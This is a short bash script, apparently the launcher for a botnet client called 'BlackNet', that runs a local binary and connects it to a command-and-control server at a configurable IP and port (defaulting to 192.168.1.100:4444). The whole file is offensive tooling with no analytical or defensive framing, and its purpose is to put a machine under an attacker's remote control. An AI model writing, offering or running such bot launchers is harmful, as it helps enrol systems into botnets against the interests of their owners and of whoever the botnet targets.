#!/bin/bash
# BlackNet Bot — connect to C2 server

C2_IP="${1:-192.168.1.100}"
C2_PORT="${2:-4444}"

echo "[+] Starting bot, connecting to $C2_IP:$C2_PORT ..."
./blacknet --connect "$C2_IP:$C2_PORT"
